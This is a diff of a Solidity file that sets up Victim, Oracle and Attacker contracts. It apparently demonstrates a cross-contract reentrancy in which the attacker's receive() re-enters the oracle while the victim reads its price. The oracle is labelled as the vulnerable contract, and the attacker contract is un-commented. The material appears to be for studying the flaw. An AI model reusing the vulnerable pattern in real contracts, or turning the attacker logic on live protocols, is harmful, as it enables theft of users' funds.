@@ -1,32 +1,30 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface IAlpha {
-    function totalETHView() external view returns (uint256);
-    function totalSupplyView() external view returns (uint256);
-    function work(address strategy) external payable;
-}
-
 interface IStrategy {
     function execute() external;
-}
-
-interface IRari {
-    function withdraw() external returns (uint256);
 }
 
 // CONTROL FLOW: A.execute() -> LOOP { V.withdraw() -> A.receive() -> O.work() -> A.execute() -> V.withdraw() ... }
 
 
-contract A is IRari {
-    IAlpha public alpha;
+contract Victim {
+    Oracle public o;
+    bool private flag = false;
 
-    constructor(address _alpha) {
-        alpha = IAlpha(_alpha);
+    constructor(address _o) {
+        o = Oracle(_o);
     }
 
-    function withdraw() external returns (uint256) {
-        uint256 rate = alpha.totalETHView() * 1e18 / alpha.totalSupplyView();
+    modifier nonReentrant() {
+        require(!flag, "Locked");
+        flag = true;
+        _;
+        flag = false;
+    }
+
+    function withdraw() nonReentrant external returns (uint256) {
+        uint256 rate = o.totalETHView() * 1e18 / o.totalSupplyView();
         uint256 amountETH = rate * 1000 / 1e18;
 
         //payable(msg.sender).transfer(amountETH);
@@ -40,7 +38,7 @@ contract A is IRari {
 }
 
 // this is the VULNERABLE CONTRACT
-contract B is IAlpha {
+contract Oracle {
     uint256 public totalETH;
     uint256 public totalSupply;
 
@@ -58,21 +56,20 @@ contract B is IAlpha {
     }
 }
 
-/*
-contract C is IStrategy {
-    IRari public rari;
-    IAlpha public alpha;
+contract Attacker is IStrategy {
+    Victim public v;
+    Oracle public o;
 
-    constructor(address _rari, address _alpha) {
-        rari = IRari(_rari);
-        alpha = IAlpha(_alpha);
+    constructor(address payable _v, address _o) {
+        v = Victim(_v);
+        o = Oracle(_o);
     }
 
     function execute() external {
-        rari.withdraw();
+        v.withdraw();
     }
 
     receive() external payable {
-        alpha.work(address(this));
+        o.work(address(this));
     }
-}*/
+}
